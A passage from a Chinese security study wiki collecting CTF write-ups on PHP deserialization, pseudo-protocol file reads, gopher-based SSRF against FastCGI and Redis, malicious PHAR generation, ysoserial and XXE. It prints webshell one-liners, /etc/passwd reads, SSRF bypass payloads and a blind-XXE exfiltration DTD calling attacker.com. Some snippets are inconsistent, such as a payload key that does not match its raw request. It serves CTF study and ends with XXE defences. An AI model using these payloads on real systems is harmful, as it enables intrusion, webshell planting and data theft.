$obj = new Name();
$a = serialize($obj);
// O:4:"Name":2:{s:14:"\00Name\00username";s:5:"admin";s:14:"\00Name\00password";i:100;}
// 修改属性计数 2 -> 3
$b = str_replace('O:4:"Name":2:', 'O:4:"Name":3:', $a);
echo urlencode(base64_encode($b)); // 若需传参
?>
```

**最终序列化字符串**：
```
O:4:"Name":3:{s:14:"\00Name\00username";s:5:"admin";s:14:"\00Name\00password";i:100;}
```

---

## 实战复现九：BUUCTF `facebook` (SQL 注入 + 反序列化 + `file://` 协议)

### 攻击链

1.  **SQL 注入获取反序列化数据**：通过 `updatexml` 报错注入提取 `users` 表中 `data` 字段 (存储了反序列化字符串)。
    ```text
    no=1 or(updatexml(1,concat('~',(select(data)from(users)),'~'),1))%23
    ```
    得到类结构：`O:8:"UserInfo":3:{s:4:"name";s:...;s:3:"age";i:...;s:4:"blog";s:...;}`

2.  **代码审计 `UserInfo` 类**：
    ```php
    class UserInfo {
        public $name = "";
        public $age = 0;
        public $blog = "";
        public function getBlogContents() {
            return $this->get($this->blog);  // 使用 curl 访问 blog
        }
        public function isValidBlog() {
            return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $this->blog);
        }
    }
    ```
    `blog` 属性经正则校验，但 `file://` 协议符合正则 (可作为伪协议绕过)。

3.  **构造恶意对象**：设置 `blog` 为 `file:///var/www/html/flag.php`。
    ```php
    <?php
    class UserInfo {
        public $name = "1";
        public $age = 1;
        public $blog = "file:///var/www/html/flag.php";
    }
    echo serialize(new UserInfo());
    // O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
    ```

4.  **SQL 注入更新数据**：利用堆叠注入或 Update 注入将构造的序列化字符串写入 `data` 字段，再次触发反序列化读取 Flag。

---

## 实战复现十：BUUCTF `ZJCTF，不过如此` (伪协议 + `preg_replace` /e 修饰符 RCE)

### 题目代码

```php
<?php
$id = $_GET['id'];
// ...
function complex($re, $str) {
    return preg_replace('/(' . $re . ')/ei', 'strtolower("\\1")', $str);
}
foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}
function getFlag() {
    eval($_GET['cmd']);
}
?>
```

### 利用步骤

1.  **读取源码**：`file=php://filter/read=convert.base64-encode/resource=next.php`
2.  **利用 `/e` 修饰符代码执行**：`preg_replace` 的 `/e` 修饰符会将替换部分作为 PHP 代码执行。
    *   构造正则使 `\\1` 变为可控代码，例如传入 `re=.*` 和 `str=system('ls')`，但需绕过 `strtolower`。
    *   实际利用：`/?.*=system('cat /flag')` 等变体。
3.  **蚁剑连接**：写入 Webshell 后连接。

---

## 实战复现十一：BUUCTF `easy_serialize_php` (反序列化中的对象逃逸)

> 参考：[Zero_Adam 博客](https://blog.csdn.net/Zero_Adam/article/details/113710343)

### 核心代码片段

```php
$_SESSION['user'] = 'guest';
$_SESSION['function'] = $function;
$_SESSION['img'] = base64_encode('guest_img.png');
// ...
extract($_POST);  // 变量覆盖
// ...
if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}
// ...
$userinfo = unserialize($serialize_info);  // 反序列化
echo file_get_contents(base64_decode($userinfo['img']));
```

### 利用原理：对象逃逸 (Variable Overwrite + Filter Bypass)

1.  **变量覆盖**：`extract($_POST)` 允许覆盖 `$_SESSION` 变量。
2.  **Filter 函数过滤关键词**：`filter($img)` 将 `php`、`flag` 等替换为空。
3.  **序列化结构控制**：通过精心构造 `$_SESSION['user']` 和 `$_SESSION['function']` 的值，使得经过 `filter` 后，序列化字符串中原本属于 `function` 的值被截断，导致 `img` 的键值对“逃逸”出来，被当作顶层数组的键值对解析。
4.  **构造恶意 `img` 值**：指向 `d0g3_f1ag.php` (Base64: `ZDBnM19mMWFnLnBocA==`)。

### 关键 Payload 构造步骤

1.  计算正常序列化结构：`a:3:{s:4:"user";s:...;s:8:"function";s:...;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`
2.  利用 `filter` 删除 `flag` 等字符，导致长度变化，需填充垃圾字符使长度匹配。
3.  最终 POST 数据示例：
    ```text
    _SESSION[user]=flagflagflagflagflagflagflag&_SESSION[function]=a:2:{";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"chen";s:4:"qwsn";}
    ```
    (具体长度需本地调试)

---

## 实战复现十二：BUUCTF `PHPWEB` (代码审计 + 反序列化 + `disable_functions` 绕过)

### 题目逻辑

```php
$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter","array_walk","array_map","register_shutdown_function","register_tick_function","filter_var","filter_var_array","uasort","uksort","array_reduce","array_walk","array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");

function gettime($func, $p) {
    if ($a == "string") { return $result; } else { return ""; }
}

class Test {
    var $p = "Y-m-d h:i:s a";
    var $func = "date";
    function __destruct() {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}

// 可控输入
$func = $_GET['func'];
$p = $_GET['p'];
if ($func != null) {
    if (!in_array($func,$disable_fun)) {
        echo gettime($func, $p);
    } else { die("Hacker..."); }
}
```

### 利用链

1.  **反序列化入口**：题目未显式给出，但通常通过 Cookie 或参数传入序列化字符串。
2.  **`__destruct` 调用 `gettime`**：`$this->func` 可控，`$this->p` 可控。
3.  **绕过 `disable_functions`**：`gettime` 内部使用 `call_user_func` 调用 `$func`，但 `$func` 被黑名单过滤。然而 `gettime` 中有一个未过滤的变量 `$a` (未定义) 和 `$result` (未定义)，可能存在变量覆盖或利用 `call_user_func` 的特性绕过。
4.  **实战 Payload**：构造 `Test` 对象，`func` 设为 `system`，`p` 设为命令 (如 `find / -name *flag*`)。
    ```php
    <?php
    class Test {
        var $func = 'system';
        var $p = "find / -name *flag*";
    }
    echo serialize(new Test());
    // O:4:"Test":2:{s:4:"func";s:6:"system";s:1:"p";s:19:"find / -name *flag*";}
    ```
    传入后触发 `__destruct` 执行命令。

---

## 实战复现十三：BUUCTF `had a had day` (文件包含伪协议读取)

### 题目代码

```php
<?php
$file = $_GET['category'];
if(isset($file)){
    if( strpos($file, "woofers") !== false || strpos($file, "meowers") !== false || strpos($file, "index") ){
        include ($file . '.php');
    }else{
        echo "Sorry, we currently only support woofers and meowers.";
    }
}
?>
```

### 利用

需包含文件名含 `woofers`/`meowers`/`index`，且自动添加 `.php` 后缀。利用 `php://filter` 去除后缀影响：
```text
?category=php://filter/convert.base64-encode/resource=flag
```
注意：`resource=flag` 不带后缀，`include` 会加 `.php`，但伪协议中 `resource` 参数可直接指定完整路径 `flag` (若文件名为 `flag` 无后缀) 或 `flag.php` (需绕过后缀添加)。实际测试发现去除后缀后成功。

---

## SSRF 场景下的伪协议深度利用

> 来源：[[ssrf-ctf-exploitation-guide]]、CTFHUB SSRF 靶场实战复现 (归档文章 `CTFHUB靶场闯关--SSRF漏洞`)。

SSRF（Server-Side Request Forgery）漏洞允许攻击者控制服务端发起的请求。结合 PHP 伪协议，可实现内网探测、本地文件读取、攻击内网服务（FastCGI、Redis）、绕过限制等完整利用链。

### file:// 协议：本地文件读取

最基础的 SSRF 利用，直接读取服务器本地文件系统。

*   **适用函数**：`file_get_contents`、`fopen`、`curl` (需开启 `CURLOPT_FOLLOWLOCATION` 且支持 file 协议)、`SoapClient` 等。
*   **典型场景**：读取 Web 目录源码、配置文件、敏感文件。
*   **Payload 示例**：
    ```text
    # 读取 Web 根目录 index.php 源码
    ?url=file:///var/www/html/index.php
    
    # 读取 flag 文件
    ?url=file:///var/www/html/flag.php
    
    # 读取 /etc/passwd
    ?url=file:///etc/passwd
    ```
*   **实战案例 (CTFHUB - 伪协议读取文件)**：
    目标存在 `url` 参数，直接使用 `file:///var/www/html/index.php` 读取源码，发现 `flag.php` 中包含 key 值，后续配合 gopher 协议 POST 提交 key 获取 Flag。

### gopher:// 协议：发送原始 TCP 数据包 (SSRF 核心利器)

`gopher://` 协议可发送任意 TCP 数据流，是 SSRF 攻击内网非 HTTP 服务（FastCGI、Redis、MySQL、FTP 等）的核心手段。

#### 协议格式与 `_` 前缀机制

*   **格式**：`gopher://<host>:<port>/_<TCP_DATA>`
*   **关键细节**：URL 路径部分 **必须以 `/_` 开头** (即 `/_` 后跟 TCP 数据)。因为客户端 (如 `curl`) 解析 gopher URL 时，会丢弃路径的第一个字符。
    *   验证：`curl gopher://127.0.0.1:2333/abcd` -> 服务端收到 `bcd`；`curl gopher://127.0.0.1:2333/_abcd` -> 服务端收到 `abcd`。

#### 双重 URL 编码绕过解析机制

**核心原理**：SSRF 利用链通常包含 **两层请求解析**：
1.  **第一层**：攻击者构造的 Payload 经 URL 编码传给目标服务器 (Server A)。
2.  **第二层**：Server A 解码后，将 Payload 作为 URL 发起新请求 (到内网 Server B)。Server B 再次解析 URL，提取协议、主机、端口、路径。

因此，Payload 中的特殊字符（如 `\r\n` 即 `%0D%0A`、空格 `%20`、`?` `%3F` 等）必须经过 **两次 URL 编码** 才能在最终到达 Server B 时保持正确格式。

**编码流程**：
```
原始 TCP 报文 (含 \r\n)
    -> 第一次 URL 编码 (将 \r\n -> %0D%0A, 空格 -> %20 等)
    -> 手工修正：将所有 %0A 前加 %0D (即 %0A -> %0D%0A)，确保 CRLF 完整
    -> 第二次 URL 编码 (将 % -> %25, 0 -> %30, D -> %44, A -> %41 ...)
    -> 最终 Payload
```

**编码脚本示例 (Python)**：
```python
import urllib.parse

raw = """POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=a80ea933ead842996c204517423ae75e"""

# 1. 替换换行为 CRLF
raw = raw.replace('\n', '\r\n')

# 2. 第一次 URL 编码
enc1 = urllib.parse.quote(raw, safe='')

# 3. 关键修正：确保 CRLF 为 %0D%0A (quote 通常只编码 \n 为 %0A，需手工补 %0D)
# 实际中 quote 会将 \r 编码为 %0D，\n 编码为 %0A，故结果已为 %0D%0A
# 但若原始字符串只有 \n，则需手工处理

# 4. 第二次 URL 编码
enc2 = urllib.parse.quote(enc1, safe='')

# 5. 构造最终 gopher URL
payload = f"gopher://127.0.0.1:80/_{enc2}"
print(payload)
```

#### 实战一：POST 请求提交 Key 获取 Flag (CTFHUB - POST)

*   **前置条件**：通过 `file://` 读取 `index.php` 源码，发现重定向逻辑 `header("Location: /?url=_");` 需构造 POST 请求到 `flag.php` 提交 `key`。
*   **原始 HTTP 报文**：
    ```http
    POST /flag.php HTTP/1.1
    Host: 127.0.0.1:80
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 36

    key=a80ea933ead842996c204517423ae75e
    ```
*   **双重编码后 Payload**：
    ```text
    gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Dcdea2306d3bf03cc1976f28bd47357ac
    ```

#### 实战二：文件上传 Getshell (CTFHUB - 文件上传)

*   **场景**：`flag.php` 存在文件上传功能，需构造 multipart/form-data POST 包上传 Webshell。
*   **步骤**：
    1.  修改前端 HTML 添加提交按钮。
    2.  抓包获取完整的上传 POST 报文 (含 Boundary、文件内容 `GIF89a<?php @eval($_POST['pass']);?>`)。
    3.  对报文执行 **双重 URL 编码** (注意 `Content-Length` 必须准确)。
    4.  构造 `gopher://` Payload 发送。
    5.  访问上传后的 Shell 路径执行命令获取 Flag。

#### 实战三：攻击 FastCGI (PHP-FPM) 实现 RCE (CTFHUB - Fastcgi协议)

*   **原理**：PHP-FPM 默认监听 `9000` 端口，支持 FastCGI 协议。通过构造 FastCGI 报文，设置环境变量 `PHP_VALUE` 开启 `auto_prepend_file=php://input` 并注入 PHP 代码，实现任意代码执行。
*   **利用工具**：Python FastCGI Client 脚本 (如文章提供的 `2.py`)。
*   **本地生成 Payload 流程**：
    ```bash
    # 生成攻击 127.0.0.1:9000 的 FastCGI 报文，执行 system('ls /')
    python 2.py -c "<?php var_dump(shell_exec('ls /'));?>" -p 9000 127.0.0.1 /var/www/html/index.php
    ```
*   **抓包/脚本输出原始 TCP 流** -> **双重 URL 编码** -> **构造 gopher:// Payload**。
*   **工具辅助**：`Gopherus` 工具集成 FastCGI 模块，可直接生成双重编码后的 gopher payload。
    ```bash
    # Gopherus 交互式生成
    > gopherus --exploit fastcgi
    > ip: 127.0.0.1
    > port: 9000
    > file: /var/www/html/index.php
    > code: <?php system('ls /'); ?>
    ```
*   **后续利用**：执行 `system('cat /flag_xxx')` 读取 Flag。

#### 实战四：攻击 Redis 未授权访问写 Webshell (CTFHUB - Redis协议)

*   **原理**：Redis 默认监听 `6379` 端口，若无密码认证，可通过 `CONFIG SET dir` 设置工作目录为 Web 目录，`CONFIG SET dbfilename` 设置为 `shell.php`，然后 `SET` 写入 PHP 代码，`SAVE` 落盘。
*   **Redis 协议格式 (RESP)**：`*<argc>\r\n$<len>\r\n<cmd>\r\n...`
*   **利用工具**：`Gopherus` 内置 Redis 模块。
    ```bash
    > gopherus --exploit redis
    > ip: 127.0.0.1
    > port: 6379
    > dir: /var/www/html
    > filename: shell.php
    > command: <?php @eval($_POST['pass']);?>
    ```
*   **注意点**：
    *   生成的 Payload 需 **一次 URL 编码** (Gopherus 输出通常已为单次编码，视目标解析层数调整)。
    *   发送后可能返回 504 Timeout，但 Shell 可能已写入成功。
    *   直接访问 `http://target/shell.php?cmd=system("cat /flag");` 连接。

---

### SSRF 绕过技巧总结

针对目标对 URL 进行的各类校验（白名单、黑名单、解析差异），常用绕过手段如下：

| 绕过类型 | 校验逻辑示例 | 绕过 Payload / 方法 | 核心原理 |
| :--- | :--- | :--- | :--- |
| **Userinfo 欺骗** | `parse_url($url)['host']` 校验宿主 | `http://notfound.ctfhub.com@127.0.0.1/flag.php` | `parse_url` 取 `host` 为 `notfound.ctfhub.com`，但 `curl`/`fopen` 实际请求 `127.0.0.1` (RFC 3986 userinfo 语法)。 |
| **十六进制 IP** | 黑名单过滤 `127.0.0.1`、`localhost` | `http://0x7F000001/flag.php` <br> `http://2130706433/flag.php` (十进制整数) | 浏览器/HTTP 客户端支持十六进制/八进制/整数格式 IP 解析。 |
| **302 跳转** | 校验初始 URL Host，但跟随重定向 | 1. 攻击者控制 VPS 返回 `302 Location: http://127.0.0.1/flag.php` <br> 2. `?url=http://attacker.com/redirect` | 校验通过初始 URL，请求库 (curl 默认/开启 `FOLLOWLOCATION`) 跟随跳转至内网。 |
| **DNS 重绑定** | 校验域名解析 IP (TOCTOU) | 1. 域名 `rbndr.us` 解析先返回公网 IP (通过校验)，再返回 `127.0.0.1` <br> 2. `?url=http://7f000001.7f000002.rbndr.us/flag.php` | 利用 DNS TTL 短、解析记录动态变化，在校验与请求之间切换 IP。工具：`lock.cmpxchg8b.com/rebinder.html`。 |
| **端口绕过** | 仅允许 80/443 端口 | `http://127.0.0.1:80/flag.php` (显性标注) <br> 或利用上述 Userinfo/DNS 绕过隐含端口 | 显性声明允许端口，或绕过宿主校验后任意指定端口。 |
| **协议封装** | 仅允许 http/https | `file://`、`gopher://`、`dict://` 等 (若函数支持) | 利用 PHP 封装协议特性，非 HTTP 协议同样可发起请求。 |

---

## PHAR 反序列化利用补充

> 虽 BUUCTF 归档中未直接出现 PHAR 题目，但作为 PHP 反序列化高级利用手法，此处补充核心原理与利用条件。

### 原理

PHP 在处理 `phar://` 协议流时，会解析 PHAR 归档的元数据，该元数据以序列化形式存储。当文件操作函数（如 `file_exists`、`fopen`、`file_get_contents`、`unlink` 等）参数可控并指向 `phar://` 路径时，会触发元数据反序列化，从而引发对象注入。

### 利用条件

1.  **`phar.readonly = Off`** (php.ini) —— 需要生成 PHAR 文件时关闭，利用时目标服务器可为 On。
2.  **存在可控的文件操作函数参数** (如 `img=phar:///path/to/file`)。
3.  **目标类定义中存在可利用的魔术方法** (`__destruct`、`__wakeup`、`__toString` 等)。
4.  **PHAR 文件上传/写入成功** (通常结合文件上传漏洞，上传含恶意元数据的图片马)。

### 生成恶意 PHAR 脚本示例

```php
<?php
class Evil {
    public $cmd = "system('cat /flag');";
    public function __destruct() {
        eval($this->cmd);
    }
}

$phar = new Phar("exp.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); // 设置存根
$phar->setMetadata(new Evil()); // 将恶意对象写入元数据
$phar->addFromString("test.txt", "test"); // 添加文件
$phar->stopBuffering();
?>
```

### 利用流程

1.  本地运行上述脚本生成 `exp.phar`。
2.  修改后缀为 `.jpg`/`.png` 绕过上传检测，上传至服务器。
3.  触发文件操作函数：`file_exists("phar:///var/www/uploads/shell.jpg")` 或 `fopen("phar://...")`。
4.  反序列化触发 `__destruct` 执行命令。

---

## Java 反序列化基础与特征识别

> 来源：XD安全 Day37-38 学习笔记

### 核心 API

*   **序列化**：`java.io.ObjectOutputStream` -> `writeObject(obj)`
*   **反序列化**：`java.io.ObjectInputStream` -> `readObject()`
*   **文件约定**：序列化文件通常使用 `.ser` 扩展名。

### 特征识别 (黑盒判断)

| 编码形式 | 特征字符串/字节 | 说明 |
| :--- | :--- | :--- |
| **Base64** | 以 `rO0AB` 开头 | Java 序列化数据 Base64 编码后的典型特征。 |
| **Hex (十六进制)** | 以 `aced` 开头 | Java 序列化流的 Magic Number (`0xACED`) 及版本号 (`0x0005`)。 |

> **Base64 作用**：将不可打印的二进制序列化字节转为可打印 ASCII 字符，便于在 HTTP 头、Cookie、JSON 等文本协议中传输。

### 利用工具链：ysoserial

*   **项目地址**：[frohoff/ysoserial](https://github.com/frohoff/ysoserial)
*   **核心功能**：生成利用常见库 (CommonsCollections, Spring, Groovy 等) Gadget Chain 的恶意序列化 Payload。
*   **使用示例**：
    ```bash
    # 生成 CommonsCollections1 链执行命令，输出 Base64
    java -jar ysoserial-all.jar CommonsCollections1 "calc.exe" | base64
    ```
*   **注意**：`readObject` 执行命令通常**无回显**，实战中常需反弹 Shell 或使用 DNSLog/HTTP 请求带外验证。

### 反序列化数据分析工具：SerializationDumper

*   用于解析已有的序列化流 (Base64/Hex 解码后)，还原对象图结构，辅助分析 Gadget Chain 入口点。
*   配合 `ysoserial` 反向操作：解码 -> 分析结构 -> 确定利用链 -> 生成 Payload。

---

## XXE 漏洞利用与绕过补充

> 来源：XD安全 Day39 学习笔记、[[xxe-xml-dtd-fundamentals]]

XXE (XML External Entity Injection) 利用 XML 解析器处理外部实体的特性，造成文件读取、SSRF、RCE 等危害。与 PHP 伪协议利用有异曲同工之妙 (均利用协议封装)。

### 基础利用：任意文件读取

**Payload 模板**：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```
*   **原理**：定义外部实体 `xxe` 指向 `file://` 协议，在 XML 数据中引用 `&xxe;` 触发解析器读取文件内容并回显。

### 进阶利用：内网探测与攻击内网应用 (SSRF)

利用 `http://` 或 `gopher://` 等协议探测内网端口、攻击内网 Web 服务。

**Payload 示例 (探测 192.168.1.1:8080)**：
```xml
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/index.txt">
]>
<root>&xxe;</root>
```

### 无回显利用：带外数据外带 (OOB / Blind XXE)

当应用不回显实体内容时，需将数据发送到攻击者控制的服务器。

#### 方法一：HTTP 协议外带 (需目标服务器出网)

```xml
<!DOCTYPE root [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
    %dtd;
    %send;
]>
```
**攻击者服务器 `evil.dtd` 内容**：
```dtd
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%payload;
```
*   **原理**：参数实体 (`%name;`) 只能在 DTD 中声明和引用。通过加载远程 DTD，动态构造发送数据的实体 `send`。

#### 方法二：FTP 协议外带 (适用于仅允许 FTP 出网环境)

原理类似，`evil.dtd` 中 `send` 实体使用 `ftp://attacker.com/%file;`。

#### 方法三：本地 DTD 复用 (绕过出网限制)

若目标禁止出网，可尝试利用本地已有的 DTD 文件 (如 `file:///usr/share/yelp/dtd/docbookx.dtd`) 构造类似利用链，但受限于本地 DTD 结构，通用性较低。

### 编码绕过：UTF-16BE

当过滤器拦截 `<!ENTITY`、`SYSTEM`、`file://` 等关键字时，可尝试将 XML 内容编码为 **UTF-16BE** (Big Endian)，并在 XML 声明中指定编码。

*   **原理**：部分 XML 解析器支持自动检测 UTF-16 BOM (Byte Order Mark) 或声明编码并解码，而 WAF/过滤器可能仅匹配 ASCII/UTF-8 字节流，导致绕过。
*   **操作**：将 Payload 转为 UTF-16BE 字节流 (每字符前补 `\x00`)，发送原始字节数据。
*   **参考**：<https://cnblogs.com/20175211lyz/p/11413335.html>

### 协议绕过

若 `http://`、`file://` 被过滤，尝试 `ftp://`、`gopher://`、`dict://`、`jar://`、`netdoc://` 等 PHP/Java 支持的协议。

### 漏洞发现与检测

1.  **流量特征**：抓包查看 `Content-Type` 为 `application/xml`、`text/xml`、`application/x-xml` 等。
2.  **手工测试**：修改请求体为 XML 格式，注入 `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` 并引用 `&xxe;`，观察报错或回显。
3.  **自动化工具**：
    *   **XXEinjector** (Ruby 编写) - 自动化 Fuzz Payload、带外验证。
    *   **Goby / Nessus / Nmap / Xray** - 集成 XXE 检测插件。

### XXE 修复方案

| 语言/库 | 核心防御代码/配置 |
| :--- | :--- |
| **PHP (libxml)** | `libxml_disable_entity_loader(true);` (PHP < 8.0) <br> PHP 8.0+ 默认禁用外部实体。 |
| **Java (DocumentBuilderFactory)** | `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);` <br> `dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);` <br> `dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);` <br> `dbf.setExpandEntityReferences(false);` |
| **Python (lxml/defusedxml)** | 使用 `defusedxml` 库替代标准库；或 `parser = etree.XMLParser(resolve_entities=False, no_network=True)` |
| **通用策略** | 1. 禁用外部实体解析 (最彻底)。<br> 2. 过滤用户输入 XML 中的 `<!DOCTYPE`、`<!ENTITY` 关键字 (防御不完全，易绕过)。<br> 3. 使用不支持 DTD 的简化解析器。 |

---

## 核心知识点总结

### 伪协议组合拳
*   **`data://` + `php://filter`**：`data://` 用于注入可控字符串绕过校验；`php://filter` 用于源码泄露（绕过 `include` 执行、获取类结构）。
*   **`file://` (SSRF/LFI)**：直接读取本地文件，配合 `gopher://` 攻击内网服务。
*   **`gopher://` (万金油)**：构造任意 TCP 报文，攻击 FastCGI、Redis、MySQL、FTP、SMTP 等内网服务，实现 RCE、写 Shell、数据窃取。
*   **`phar://` (反序列化触发器)**：利用文件操作函数触发元数据反序列化，打 POP 链。
*   **条件依赖**：利用前必确认 `phpinfo()` 或报错回显中的 `allow_url_fopen` 与 `allow_url_include` 状态。

### CTF 反序列化实战避坑指南

1.  **类定义一致性**：反序列化要求目标类在当前命名空间/作用域中已定义 (`include/require` 或自动加载)。本地生成 Payload 时，**必须 1:1 复制目标类代码**（属性名、修饰符 `private/protected/public`、命名空间），否则生成的序列化字符串无法正确还原对象属性（会变成 `__PHP_Incomplete_Class`）。
2.  **数字绕过通用性**：`preg_match('/\d/')` 过滤数字是常见 WAF 规则。`+` 前缀绕过 (`:+1`, `:+8`) 适用于 PHP 原生 `unserialize`。若目标使用 `igbinary` 或其他序列化器需验证兼容性。
3.  **Base64 编码链路**：
    *   `Payload -> base64_encode -> urlencode -> 传输 -> urldecode -> base64_decode -> unserialize`
    *   务必在本地脚本 `echo urlencode(base64_encode($serialized));` 一气呵成，避免手工拼接导致字符串污染。
4.  **私有/受保护属性序列化格式**：
    *   `private $prop` -> `s:length:"\00ClassName\00prop"`
    *   `protected $prop` -> `s:length:"\00*\00prop"`
    *   长度计算包含两个不可见字节 (`\00`)，手工修改极易出错，**强制要求本地代码生成**。
5.  **对象逃逸利用**：利用 `extract`、`parse_str` 等变量覆盖函数，配合过滤函数导致序列化字符串长度变化，构造键值对逃逸，控制反序列化后的数组结构 (如 BUUCTF `easy_serialize_php`)。

### SSRF 利用核心要点

1.  **协议支持度测试**：优先测试 `file://`、`dict://`、`gopher://`、 `http://`、`https://` 支持情况。
2.  **双重编码是关键**：`gopher://` Payload 必须双重 URL 编码，且注意 CRLF (`%0D%0A`) 完整性。
3.  **内网服务指纹识别**：结合 `dict://` 探测端口 Banner (Redis `INFO`、FastCGI 无 Banner 但可尝试连接)、`file://` 读取配置文件确定服务版本/路径。
4.  **工具链熟练度**：`Gopherus` (生成 gopher payload)、`FastCGI Client` (Python/Go 版)、`Redis CLI` / `Gopherus Redis` 模块、`curl` / `nc` 验证 TCP 报文。
5.  **绕过组合拳**：实际环境常组合多种绕过 (如 DNS 重绑定 + gopher 攻击 Redis)，需灵活搭配。

### Java 反序列化 & XXE 速查

*   **特征**：`rO0AB` (Base64) / `aced` (Hex) -> 确认为 Java 反序列化点。
*   **工具**：`ysoserial` 生成 Payload，`SerializationDumper` 分析结构。
*   **XXE 核心**：外部实体 + 协议封装 (`file://`, `http://`, `ftp://`)。
*   **Blind XXE**：参数实体 (`%name;`) + 远程 DTD (`evil.dtd`) + 带外信道 (HTTP/FTP/DNSLog)。
*   **绕过**：UTF-16BE 编码、协议替换、大小写混淆、注释干扰。
*   **修复**：禁用外部实体 (代码层面 `setFeature` / `libxml_disable_entity_loader`)。

---

## 关联页面

*   [[007攻防实验室]] - 文章来源归档库，包含更多 CTF 实战笔记（赣网杯2020等）。
*   [[attack-defense-world-master-advanced-writeup]] - 攻防世界高手进阶区完整 Writeup 索引，包含 `unserialize3`、`Web_php_unserialize` 等题目详解。
*   [[ssrf-ctf-exploitation-guide]] - CTFHUB SSRF 靶场完整利用指南，涵盖内网探测、多协议利用、POST 构造、文件上传、FastCGI/Redis RCE 及双重 URL 编码技巧。
*   [[ssrf-bypass-techniques]] - SSRF 绕过技巧系统梳理：用户信息、十六进制 IP、302 跳转、DNS 重绑定、localhost 绕过等五大核心技巧。
*   [[pikachu-target-writeup-part5]] - Pikachu 靶场第 5 篇实战内容，涵盖目录遍历、敏感信息泄露、PHP 反序列化、XXE 外部实体注入、不安全 URL 跳转、SSRF 服务端请求伪造六大漏洞的原理、Payload 构造、利用链分析及防御思路。
*   [[ctf-show-php-command-execution-bypass-techniques]] - PHP 命令执行与绕过技巧体系，涉及 `disable_functions`、`open_basedir` 等后续利用环境。
*   [[php-webshell-fundamentals-chopper-analysis]] - PHP Webshell 基础与蚁剑流量分析，反序列化/SSRF Getshell 后的后续操作参考。
*   [[internal-network-pivoting-techniques]] - 内网穿透/横向移动技术体系，SSRF 获取内网立足点后的代理隧道搭建实战。
*   [[buuctf-web-writeup-collection]] - BUUCTF Web 方向题目完整解题思路汇总，按漏洞类型分类并交叉引用现有技术页面。
*   [[xxe-xml-dtd-fundamentals]] - XXE 漏洞利用核心基础：XML 语法树结构、DTD 声明类型、实体引用分类、PCDATA 与 CDATA 差异，及外部实体通过 file/http 等协议实现任意文件读取的攻击原理。
*   [[php-file-inclusion-vulnerability]] - **PHP 文件包含漏洞完整知识页**，系统梳理成因、四大危险函数差异、目录穿越与截断绕过、php://filter/php://input/data:// 等伪协议利用链、任意文件下载漏洞检测与敏感文件路径清单，**本页面文件包含场景伪协议细节的核心交叉引用目标**。
*   [[xd-security-file-inclusion-notes]] - XD安全 Day31-32 文件包含学习笔记，本页面文件包含场景伪协议实战细节的主要归档来源。
*   [[mongodb-nosql-injection-guide]] - MongoDB NoSQL 注入指南，涉及反序列化对象注入变种利用思路对比参考。

---

## 参考资源

*   PHP 官方手册：[封装协议](https://www.php.net/manual/zh/wrappers.php)
*   PHP 官方手册：[魔术方法](https://www.php.net/manual/zh/language.oop5.magic.php)
*   PHP 官方手册：[unserialize](https://www.php.net/manual/zh/function.unserialize.php) (注释中有 `__wakeup` 绕过讨论)
*   CVE-2016-7124: PHP `__wakeup` 绕过漏洞分析 (对象计数不匹配)
*   赣网杯2020 Writeup 原文 (微信归档)
*   攻防世界靶场在线实战环境
*   CTFHUB 靶场 SSRF 闯关实战
*   Pikachu 靶场在线实战环境
*   Gopherus: https://github.com/tarunkant/Gopherus
*   FastCGI 协议分析: https://segmentfault.com/a/1190000013112052
*   Redis 未授权访问利用: https://blog.csdn.net/mysteryflower/article/details/94386461
*   DNS Rebinder: https://lock.cmpxchg8b.com/rebinder.html
*   PHAR 反序列化利用: https://www.leavesongs.com/PENETRATION/php-phar-unserialize.html
*   ysoserial: https://github.com/frohoff/ysoserial
*   Java 反序列化规范: https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html
*   XXE 防御备忘单 (OWASP): https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
*   XD安全渗透测试课程 Day31-39 学习笔记 (微信归档)

---

## 来源

- [0x00实验室-202108-202304_080](../sources/0x00实验室-202108-202304_080.md)
- [XD安全 Day37-39 学习笔记](../sources/XD安全-反序列化与XXE笔记.md) (归档文章内容整合)
- [0x00实验室-202108-202304_089](../sources/0x00实验室-202108-202304_089.md)
- [XD安全 Day31-32 文件包含笔记](../sources/XD安全-文件包含笔记.md) (归档文章内容整合)
- [0x00实验室-202108-202304_091](../sources/0x00实验室-202108-202304_091.md)
